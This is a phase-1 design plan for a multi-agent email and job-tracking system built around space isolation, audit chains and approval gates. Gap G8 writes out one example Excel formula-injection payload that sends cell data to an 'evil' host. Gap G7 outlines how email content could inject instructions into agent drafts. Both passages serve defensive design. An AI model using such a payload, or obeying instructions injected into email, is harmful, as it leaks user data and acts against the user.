# Plan: Agent Factory, phase 1

Status: **accepted 2026-11-23**, with the decisions recorded in section 6. Nothing in this document is implemented yet; implementation starts with M0 after this PR is merged.

This repository is public. It contains synthetic examples only: no real personal data, addresses or company-specific details, ever (SPEC 2.1).

References such as "SPEC 4.6" point to sections of [`SPEC.md`](SPEC.md), which is the source of truth. Where this plan disagrees with the spec, the disagreement is listed in section 3 with a proposal, and the spec is not changed until you approve a PR that changes it.

Labels used below:

- **Verified**: checked against a primary source or measured on 2026-11-23; the source is named.
- **Unverified**: my understanding, not yet checked. Each one says when it will be checked.

---

## 1. My understanding of the system

Agent Factory is a single-user, multi-agent system with two hard-isolated spaces, `personal` and `synaption`. An LLM proposes; deterministic code decides whether the proposal runs. Every proposal (tool call) is checked by a policy engine, every step is written to an append-only, hash-chained audit log, and every task runs as a durable Temporal workflow with hard budgets (steps, tokens, USD, wall time).

The "brain" has three jobs:

1. **Give context**: a deterministic context builder assembles, in a fixed order and with a token budget per block, the agent prompt, the space profile, preferences, relevant memory, the typed task brief and the tool definitions, and records what it included (ids and hashes).
2. **Remember**: episodic memory (finished tasks) and semantic memory (facts with embeddings in pgvector), all space-scoped by Postgres row-level security, written only through a `MemoryWriter` that checks provenance.
3. **Delegate**: one orchestrator per space delegates typed briefs to specialist agents as Temporal child workflows. A child never gets more budget than the parent has left, never inherits permissions, never crosses a space, and depth is capped (default 2).

The first specialist is the **Email Agent**, one spec run as two instances (one per space), over three mailboxes behind a `MailProvider` interface (Gmail API for two, IMAP for iCloud). It syncs incrementally every 5 minutes, triages with Haiku, labels/archives/marks read, drafts replies with Sonnet, never sends, and starts in shadow mode (records intended actions, changes nothing).

The first end-to-end use case is the **Job Applications Tracker** in the personal space: detect job-related mail cheaply, classify and extract with the LLM, link events into applications, run a status state machine, and deliver an Excel report produced by a shared documents service.

The code is public and is a portfolio; all personal data, prompts, addresses and real eval sets live in a private config repo loaded from `AF_CONFIG_DIR`.

What I consider the core invariants, in priority order, because every design choice below is judged against them:

1. Nothing in one space can read or act on the other (DB, policy, runtime, and process level).
2. No irreversible external effect without your explicit approval.
3. Untrusted content never becomes instructions and never reaches an agent or run that can send.
4. No lost or duplicated side effects across restarts.
5. Every step is reconstructable from the audit log.

---

## 2. Verified external facts this plan rests on

| Fact | Source | Consequence |
| --- | --- | --- |
| `claude-haiku-5-5`, `claude-sonnet-5-5`, `claude-opus-5-5` are current model ids. | Anthropic models overview (docs.claude.com) and the `Model` type in `anthropic` 2.12.0 (released 2026-11-20). | SPEC 3 model ids are usable as written. |
| `gmail.modify` grants "Read, compose, and send emails" and allows trashing, but not permanent deletion. | Google Gmail API scopes page. | The OAuth token itself permits send and trash. "No delete tool" and "send disabled" are enforced only by our code (gap G9). |
| An External OAuth app in "Testing" publishing status gets refresh tokens that expire after 7 days (unless only profile scopes are requested). | Google "Using OAuth 2.0" page. | Personal Gmail would need weekly re-auth unless the app is published (gap G9). |
| iCloud IMAP pre-authentication `CAPABILITY` is `XAPPLEPUSHSERVICE IMAP4 IMAP4rev1 SASL-IR AUTH=ATOKEN AUTH=PLAIN AUTH=ATOKEN2 AUTH=XOAUTH2`. No `MOVE`, `UIDPLUS`, `CONDSTORE` or `QRESYNC` is advertised before login. | Measured: `openssl s_client` to `imap.mail.me.com:993`, `a1 CAPABILITY`, 2026-11-23. | Post-login capabilities are **unverified** (servers often advertise more after login). Checked in M5 with your app password, run locally by you or with a secret you provide. Design must work without `MOVE`/`CONDSTORE` (gap G4, ADR 0006). |
| Latest releases: `temporalio` 1.36.1 (2026-11-14), `mcp` 2.3.0 (2026-10-02), `aioimaplib` 2.0.3 (2026-10-13), `imapclient` 4.3.0 (2026-11-17), `fastembed` 0.9.1 (2026-10-24), `weasyprint` 70.0 (2026-09-08), `openpyxl` 3.1.5 (2024-06-28), `formulas` 1.3.4 (2026-03-11). | PyPI JSON API, 2026-11-23. | All maintained and support Python 3.12. `openpyxl` has had no release since 2024-06; it is still the standard and is what SPEC 3 names. |
| `fastembed` 0.9.1 ships multilingual text models including `intfloat/multilingual-e5-large`, `sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2` and `paraphrase-multilingual-mpnet-base-v2`. | `fastembed/text/*.py` in the 0.9.1 wheel. | A local multilingual embedder is available without a second vendor (ADR 0004). |

---

## 3. Gaps, risks and contradictions

Each item: what, where, why it matters, what I propose. Items marked **[decision]** were answered on 2026-11-23 (section 6). The others are applied as proposed.

### Contradictions inside the spec

**G1. `core/` purity vs the Anthropic implementation living in `core/llm/`. [decision]**
SPEC 4 places "LLMProvider interface + Anthropic implementation" in `core/llm/`; SPEC 9.5 says `core/` has no framework or vendor imports.
Proposal: `core/llm/` holds the `LLMProvider` protocol, request/response types and a `FakeLLMProvider`; the Anthropic implementation moves to `integrations/llm/anthropic/`. Same for anything Temporal, SQLAlchemy, FastAPI or MCP. I propose that **Pydantic is the one allowed third-party import in `core/`**, because SPEC 4.1 requires `AgentSpec` to be validated by Pydantic. An import-linter rule in CI enforces the boundary so it does not depend on review.

**G2. Append-only audit vs 30-day retention of email bodies.**
SPEC 4.7 says the audit table allows no UPDATE or DELETE, and also that email body content is kept 30 days and then reduced to metadata. Both cannot hold for the same row. SPEC 4.7 also says context is recorded as "ids and hashes, not full content".
Proposal: bodies never enter `audit_events`. They go to a separate space-scoped `message_content` table keyed by SHA-256 of the content; the audit event stores only the hash. The retention job runs as a dedicated role whose only grant is DELETE on `message_content`. The chain stays verifiable after deletion because it hashes the content hash, not the content.

**G3. A single hash chain cannot span two isolated spaces.**
Appending to a chain needs the previous row's hash. A global chain would make every space read the other space's last audit row, which SPEC 2.2 forbids.
Proposal: one chain per space. Appends are serialised per space by locking that space's chain-head row (`SELECT ... FOR UPDATE`), so concurrent activities cannot fork the chain. Space-less events (the global pause in SPEC 7) are written once into each space's chain.
Known limit, stated in SECURITY.md: the table owner can rewrite the whole chain consistently. The chain detects edits by the app role and accidents, not a compromised owner. A common way this protection silently fails is an application that connects as the table owner, so RLS and REVOKEs guard only against mistakes; here the app roles never own tables (ADR 0002). Decision: anchoring chain heads outside the database is included in M7.

**G4. iCloud has no labels, and in IMAP a folder is a location. [decision]**
SPEC 3 says to map categories to IMAP folders under `AF/`. On IMAP, putting a message in `AF/finance` removes it from INBOX, so `mail.apply_labels` and `mail.archive` become the same operation, and a message cannot carry a label while staying in the inbox. Moving also changes the message's UID, which breaks references to it. `MOVE` and `UIDPLUS` are not advertised before login (section 2).
Proposal: the canonical classification lives in our database for every provider (SPEC 3 already says so for iCloud). On iCloud, `apply_labels` records the label in our DB and sets an IMAP keyword only if post-login `PERMANENTFLAGS` allows custom keywords (to measure in M5); otherwise it changes nothing on the server. Only `archive` moves the message, to `AF/<category>`. Messages are tracked by `Message-ID` header plus folder, not by UID alone. Details in ADR 0006.

**G5. One `spec.yaml` cannot describe two instances in two spaces. [decision]**
SPEC 4.1 gives `AgentSpec` a single `space`; SPEC 5 wants one Email Agent spec run as two instances; SPEC 4.5 wants a new agent to be one folder.
Proposal: `spec.yaml` declares `spaces: [personal, synaption]`. The registry creates one instance per space with id `<agent>.<space>` (`email.personal`, `email.synaption`). Every instance is bound to exactly one space at load time, and all policy, budgets, audit, pause and memory key on the instance id. Space-specific values (allowed mailboxes, categories, label rules) come from `AF_CONFIG_DIR`, not from the public spec. Orchestrators keep one folder per space, as the spec lists them.

**G6. The Job Tracker flow needs tools the spec does not define. [decision]**
SPEC 5.4 says the Email Agent "writes results to the tracker tables", but agents act only through declared tools (SPEC 2.3, 4.5) and no `tracker.*` tool exists. Stages 1 (detection), 4 (linking) and 5 (status) are deterministic by the spec's own description; running them as an LLM tool loop would make them non-deterministic and costly.
Proposal: the tracker pipeline is a Temporal workflow in `integrations/tracker/`: deterministic code for stages 1, 4, 5 and LLM activities (through `LLMProvider`, batch API for backfill) for stages 2 and 3. The personal Email Agent reaches it through a small `tracker` MCP server: `tracker.start_backfill` (write_reversible; the workflow itself waits for approval when the cost estimate exceeds the budget), `tracker.get_status` (read), `tracker.get_report_data` (read). The agent then calls `docs.create_xlsx`. The flow "orchestrator delegates, agent produces the Excel" stays as you described; only the mechanism for writing tables changes.

### Security gaps

**G7. Untrusted-content taint must propagate through delegation and drafts.**
SPEC 2.5 says an agent that reads untrusted content must not be able to send. With delegation, the orchestrator receives results derived from email bodies, so the rule must follow the data, not just the agent.
Proposal: every run carries a `tainted` flag, set when it reads untrusted content directly or receives a child result that was tainted. The policy engine denies any `irreversible` or external-effect tool for a tainted run, whatever the agent declares. In v1 no agent has send, so this costs little now and is in place before WhatsApp or `mail.send_draft` are enabled.
Residual risk, to document: a draft reply is built from an untrusted email, so injected text (for example a link) can end up in a draft that you later send by hand. Drafts are labelled `AF/draft` and listed in the digest; I will add an injection test asserting that instructions inside an email do not change the draft's recipients.

**G8. Excel formula injection from email-derived strings.**
"No macros" (SPEC 5.1) does not cover cells: a company name or subject such as `=HYPERLINK("http://evil/"&A1)` written by openpyxl becomes a live formula.
Proposal: `docs.create_xlsx` writes every data value with an explicit string type, and only formulas declared in the trusted spec's formula fields are written as formulas. A test feeds strings beginning with `=`, `+`, `-`, `@`, tab and carriage return and asserts they stay text.

**G9. Gmail OAuth: the scope allows send and trash; consumer refresh tokens may expire weekly. [decision]**
Verified (section 2): `gmail.modify` allows sending and trashing, and an External app in Testing gets 7-day refresh tokens. No narrower Gmail scope lets us change labels on messages, so `gmail.modify` is the right minimum, but it means least privilege at the OAuth level is impossible and is enforced in our code.
Proposal: one Google Cloud project per space (the boundary matches SPEC 2.2). The refresh token is decryptable only inside that space's mail MCP server process (ADR 0003, 0005), which exposes no trash tool, and whose send path checks both the feature flag and an approved `Approval` row.
For the consumer Gmail the options are: keep the app in Testing and re-auth weekly, or publish it, which for a restricted scope brings the "unverified app" screen and may require Google verification (exact limits **unverified**; I will read Google's current policy before M5 and report). For Workspace, an "Internal" app inside the synaption Workspace should avoid both (**unverified**, same check).
Decision: start in Testing. Before M5a starts, I report Google's current policy for a single-user External app with `gmail.modify` in production status and recommend the option that avoids weekly re-auth.

**G10. Gateway authentication is not specified. [decision]**
SPEC 4 lists "auth" for the gateway, and the gateway serves approvals, file downloads, digests, pause and the OAuth callback, but the spec does not say how you authenticate. On a public VPS, the approvals endpoint is the most sensitive surface in the system: whoever can call it can approve a send.
Proposal: Caddy terminates TLS; the gateway requires a bearer token per space (stored in the secret manager, compared in constant time, scoped to that space), and approval decisions additionally require the token for the approval's own space.
Decision: both controls. Per-space bearer tokens behind Caddy TLS, **and** the gateway reachable only over Tailscale. Nothing is public in this phase, including the Google OAuth flow, which uses a loopback flow from your machine over Tailscale ([ADR 0007](adr/0007-private-network-and-oauth.md)). Future public webhooks (WhatsApp) get their own ADR.

**G11. LLM traces and error reports would carry email content from both spaces. [decision]**
Langfuse and Sentry (SPEC 3) would receive prompts containing email bodies. Langfuse Cloud sends personal mail to a third party; a self-hosted Langfuse (v3) needs extra services (ClickHouse, Redis, object storage; footprint **unverified**) on the same VPS.
Proposal: one Langfuse project per space; prompts and completions are redacted to metadata and hashes by default, with full content only behind a per-space flag; Sentry with PII sending off and a scrubber for bodies and tokens. Cloud vs self-hosted is your call; this only matters in M7.

### Durability and runtime

**G12. Activities are at-least-once, and some mail operations are not idempotent.**
SPEC 2.7 wants no duplicated work across restarts; SPEC 4.2 asks for idempotency keys. Label, archive and mark-read are idempotent. `mail.create_draft` is not: a retry after a timeout creates a second draft. An IMAP move retried after success finds the message gone.
Proposal: every tool call gets a key `(workflow_id, step_no, tool)`; a `tool_effects` table records intent before and result after; `create_draft` stamps an `X-AF-Idempotency-Key` header and looks for an existing draft with that key before creating one. The durability test (SPEC 6) kills the worker between "provider call returned" and "activity completed" and asserts exactly one draft. Details in ADR 0001.

**G13. The agent loop must be deterministic workflow code without importing Temporal into `core/`.**
Proposal (ADR 0001): `core/runtime` is a pure state machine: given state and the last observation it returns the next command (call LLM, call tool, finish, escalate). The Temporal workflow in `apps/worker` drives it and turns commands into activities. Budgets use workflow time and recorded usage, never the wall clock. Email bodies and large tool outputs are not passed through workflow history; activities exchange content references (hash ids into `message_content`), keeping history small (Temporal payload and history size limits apply; exact current limits **unverified**, read in M4).

**G14. Single-VPS footprint is unmeasured.**
Postgres with pgvector, Temporal server and UI, Redis, Caddy, gateway, two workers (ADR 0002 runs one per space), and optionally self-hosted Langfuse. I will not guess a VPS size: M0 measures idle and loaded memory with `docker stats` and reports it. Temporal will use its own database on the same Postgres instance. Temporal's `auto-setup` image is meant for development (**unverified**, checked in M0); the production compose file will run schema setup as a separate one-shot step.

### Data and configuration

**G15. Two possible homes for profile and preferences.**
SPEC 2.1 puts space profiles and preferences in the private config repo; SPEC 4.4 says memory lives in Postgres with RLS. Copying config into the DB creates two sources of truth that drift.
Proposal: profile and preferences are read from `AF_CONFIG_DIR` at context-build time and never copied into the DB; the context builder records their file hash in the audit log, so every run states which version it used. Memory (episodic, semantic) lives only in Postgres.

**G16. Space-scoped file storage is not specified.**
SPEC 5.1 says files are "stored encrypted in space-scoped storage".
Proposal: one local volume directory per space, each file encrypted with a per-file data key wrapped by the space key (ADR 0005), metadata in a space-scoped table with RLS, included in the restic backup.

**G17. Evaluating Excel formulas for "totals recompute correctly". [decision]**
SPEC 5.1 requires validating that totals recompute; the `Summary` sheet uses live formulas (SPEC 5.4). openpyxl writes formulas without computed values and nothing in the stack evaluates them, so as specified the check cannot run. A file without cached values also shows blank cells in some viewers until opened in Excel.
Options: (a) evaluate the workbook in Python with `formulas` (maintained, 1.3.4) and compare to totals computed from source data; (b) recalculate with headless LibreOffice, which also stores computed values in the file, at the cost of a large image dependency.
Proposal: (a), with a test that fails if a formula uses a function `formulas` cannot evaluate; fall back to (b) only if that test fails for a formula we need.

### Process and quality

**G18. M5 is too large for one reviewable PR. [decision]**
Proposal: M5a (mail interface, Gmail and IMAP adapters with fixtures, mail MCP server, OAuth flow, sync, shadow mode) and M5b (triage, actions, drafts, digest, injection tests, evals). Section 4 lists both.

**G19. Evals in CI need live LLM calls. [decision]**
SPEC 6 wants CI to report eval accuracy; it also wants LLM calls mocked in unit tests. Live evals in CI cost money on each push and need the Anthropic key as an Actions secret (in a public repo, workflows from forks do not receive secrets).
Proposal: PR CI runs the eval harness against recorded responses (tests the harness and scoring, not the model); a separate `eval` workflow runs live on `main` and on manual dispatch, posts the accuracy table, and has its own cost cap.

**G20. The eval targets are coarse at the specified sample sizes.**
40 emails at the 90% target means at most 4 errors; 36/40 has a 95% Wilson interval of 76.9% to 96.0%, and even 40/40 only supports "above 91.2%". For tracker precision of at least 95%, the target depends on how many emails are predicted job-related: with 30 predicted positives, 1 false positive gives 96.7% and 2 give 93.3%, so the target means "at most one false positive".
Proposal: reports show counts and intervals, not only percentages, and the thresholds are stated as gates on the named dataset, not as claims about real mail. The real private set is where the turn-off-shadow-mode decision should be made.

**G21. Triage has no confidence threshold. [decision]**
SPEC 5.4 defines `needs_review` below a confidence threshold for the tracker; SPEC 5.2 has `confidence` in triage output but no rule for low confidence.
Proposal: below a per-space threshold (in config), the agent records the classification and takes no mailbox action; the message is listed in the digest under "needs review".

**G22. Redis holds no space isolation.**
Redis is outside RLS. Proposal: Redis stores only rate-limit counters and cache keys prefixed with the space, never message content, tokens or memory. Not a decision, recorded so it stays true.

---

## 4. Milestones

One branch and PR per milestone; I stop after each for your review (SPEC 9.2). Each PR states what was built, what was tested, the first real GitHub Actions result (not a local pass), and open decisions.

| Milestone | Builds | Done when |
| --- | --- | --- |
| **M0** Repository and tooling | uv project (Python 3.12), ruff, pyright (strict on `core/`), pytest, pre-commit with gitleaks, import-linter boundary for `core/` (G1), `config.example/`, pydantic-settings, structlog JSON logs, Docker Compose (Postgres 16 + pgvector, Redis, Temporal + UI, gateway, worker) with every published port bound to loopback and a test that fails otherwise (ADR 0007), health and readiness endpoints, Makefile targets, CI (lint, typecheck, test, gitleaks, Docker build), MIT licence (already present), `.gitignore` additions. | `docker compose up` brings the stack up healthy; CI green on GitHub; measured memory footprint in the PR (G14). |
| **M1** Domain, database, audit | `core/domain` models; SQLAlchemy models and Alembic migrations; roles and RLS per ADR 0002; per-space audit chain (G2, G3); `message_content` table. | Space isolation test (DB level) red on any cross-space read or write; chain verification test detects a tampered row; migrations check in CI. |
| **M2** LLM layer and runtime | `LLMProvider` + fake in core, Anthropic adapter in integrations (prompt caching, structured output); runtime state machine (G13); budgets; tool registry with risk metadata owned by our code; MCP client; policy engine incl. taint (G7). | Budget tests per budget type; policy unit tests incl. cross-space and undeclared tools; isolation test extended to policy and runtime. |
| **M3** Memory and context | Episodic and semantic memory services, `MemoryWriter` provenance checks, `EmbeddingProvider` (ADR 0004), context builder with per-block token budgets and audit of included ids/hashes (G15). | Deterministic context builder tests (same input, same output and hash). |
| **M4** Orchestration | Temporal workflows (ADR 0001), agent registry with per-space instances (G5), orchestrators, `delegate` with budget and depth limits, approvals (signal, 24 h expiry) via API and CLI, `ApprovalChannel` interface, run timeline endpoint, pause endpoints, gateway auth (G10, ADR 0007). | Delegation tests (budget never exceeds parent, no permission inheritance, depth cap, same space only); approval expiry test with time-skipping test server. |
| **M5a** Mail access | Precondition: Google policy report (G9) reviewed by you. `MailProvider`, Gmail adapter (recorded fixtures), iCloud IMAP adapter (ADR 0006), per-space mail MCP servers, loopback OAuth flow over Tailscale (ADR 0007), refresh-token encryption (ADR 0005), incremental sync of inbox and sent with safe resync, shadow mode. | Sync tests incl. expired `historyId` and changed `UIDVALIDITY`; no live calls in CI; post-login iCloud capabilities measured and reported. |
| **M5b** Email Agent behaviour | Triage, actions, drafts, digest, idempotent drafts (G12), injection tests, golden eval sets (synthetic, 40 per space). | Injection tests pass; eval report with counts and intervals (G20). |
| **M6** Documents and Job Tracker | Documents service and MCP server (xlsx with formula-injection guard G8 and formula evaluation G17; pdf with WeasyPrint), encrypted file storage and signed downloads (G16), tracker tables, pipeline workflow and `tracker` MCP server (G6), backfill with cost estimate and batch API, report. | Synthetic set of at least 60 emails; generated workbook validated (opens, row counts, totals recompute). |
| **M7** Hardening | OTel, Langfuse, Sentry with redaction (G11), audit chain heads anchored outside the database (G3), restic backup and restore drill, RUNBOOK, SECURITY threat model, retention job, durability tests, final review. | Restore performed from a backup in a test environment and documented; durability test passes on GitHub runners; tampering with a chain end-to-end (rewritten as owner) is detected against the external anchor. |

Credentials I will need, by milestone (placeholders only until then): Anthropic API key (M2 live smoke test, M5b live evals); Google OAuth client per space (M5a); iCloud app-specific password (M5a, ideally used only on your machine); Doppler project and a Tailscale auth key for the VPS node (first deploy, after M7). I will name the exact secret when each is needed.

---

## 5. ADRs

All accepted 2026-11-23.

| ADR | Decision |
| --- | --- |
| [0001](adr/0001-temporal-usage-pattern.md) | Temporal usage: pure core state machine driven by workflows, activities for LLM and tool calls, idempotent side effects, one task queue per space. |
| [0002](adr/0002-rls-and-space-isolation.md) | Space isolation: one DB login role and one worker per space, RLS with `FORCE`, app roles never own tables. |
| [0003](adr/0003-mcp-integration-pattern.md) | MCP: per-space MCP servers over stdio owned by the worker; risk and limits defined in our registry, not trusted from the server. |
| [0004](adr/0004-embedding-provider.md) | Embeddings: local multilingual model via fastembed behind `EmbeddingProvider`; model id stored per vector. |
| [0005](adr/0005-secret-encryption.md) | Secrets: envelope encryption (AES-256-GCM) with per-space keys from the secret manager, AAD binding to space and record. |
| [0006](adr/0006-imap-library.md) | IMAP: `imapclient` in a worker thread inside activities; behaviour without `MOVE`/`CONDSTORE`. |
| [0007](adr/0007-private-network-and-oauth.md) | Gateway reachable only over Tailscale, behind Caddy TLS and per-space bearer tokens; Google OAuth by loopback flow from your machine, code exchanged inside the space's worker. |

---

## 6. Decisions (answered 2026-11-23)

| # | Question | Decision |
| --- | --- | --- |
| 1 | G1: Pydantic as the only third-party import in `core/`; Anthropic adapter in `integrations/llm/anthropic/`. | Accepted. |
| 2 | G4: iCloud classification in our DB; only `archive` moves to `AF/<category>`. | Accepted. |
| 3 | G5: one `agents/email/` folder with `spaces: [personal, synaption]`, instances `email.personal`, `email.synaption`. | Accepted. |
| 4 | G6: tracker as a deterministic workflow behind `tracker.*` MCP tools. | Accepted. |
| 5 | G9: consumer Gmail OAuth app publishing status. | Start in Testing. Before M5a, report Google's current policy for a single-user External app with `gmail.modify` in production status and recommend the option that avoids weekly re-auth. |
| 6 | G10: gateway authentication and exposure. | Both: per-space bearer tokens behind Caddy TLS, and reachable only over Tailscale. Nothing public in this phase. OAuth flow in ADR 0007. Future public webhooks get their own ADR. |
| 7 | G11: Langfuse Cloud or self-hosted. | Decide in M7 after M0's memory measurement; redaction on either way. |
| 8 | G17: formula validation with `formulas`, LibreOffice as fallback. | Accepted. |
| 9 | G18: split M5 into M5a and M5b. | Accepted. |
| 10 | G19: live evals on `main` and manual dispatch; recorded responses in PR CI. | Accepted. |
| 11 | G21: low-confidence triage is recorded only and listed under "needs review". | Accepted. |
| 12 | ADR 0004: local embedding model. | Accepted. |
| 13 | ADR 0006: `imapclient` instead of an async IMAP library. | Accepted (deviation from SPEC 3 wording approved). |
| - | G3: anchor audit chain heads outside the database. | Included in M7. |

Next step: after this PR is merged, M0 starts on a new branch.
